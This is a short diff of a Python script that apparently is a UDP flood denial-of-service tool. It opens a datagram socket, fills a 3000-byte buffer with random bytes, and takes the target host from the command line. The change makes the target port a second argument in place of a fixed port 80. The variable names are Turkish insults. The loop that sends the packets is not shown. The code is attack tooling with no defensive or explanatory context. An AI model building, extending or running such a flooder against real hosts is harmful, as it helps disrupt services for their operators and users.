@@ -4,9 +4,10 @@ import socket, sys, os, time, random
 time.sleep(0.1)
 
 anan = sys.argv[1]
+baban = sys.argv[2]
 
 orospuevladi = anan
-port = int(80)
+port = int(baban)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bitler = random._urandom(3000)
